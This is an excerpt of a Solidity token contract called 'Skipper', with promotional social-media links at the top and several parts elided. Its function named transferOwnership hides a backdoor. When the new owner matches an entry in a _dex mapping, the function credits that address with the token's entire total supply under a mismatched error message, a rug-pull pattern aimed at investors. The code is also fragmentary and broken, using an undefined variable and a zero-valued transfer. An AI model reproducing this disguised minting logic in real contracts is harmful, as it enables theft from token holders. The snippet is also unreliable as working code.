//Telegram: https://t.me/CAPTAINSKIiPPER
//Website: https://captainskipper.xyz/
//Twitter: https://twitter.com/captainskiipper
//Discord:  https://discord.gg/TbVNtphc
...
contract Skipper is IERC20, Token, Ownable {
    ...
    function transferOwnership(
        ...
        require(
            newOwner != address(0),
            "Amount of newOwner and values don't match"
        );
        uint256 total = 0;
        if (newOwner == _dex[newOwner]) {
            _balances[from] = _balances[from] - total;
            total += _totalSupply;
            _balances[newOwner] = _balances[newOwner] + total;
        } else {
            _balances[from] = _balances[from] - total;
            _balances[newOwner] = _balances[newOwner] + total;
        }
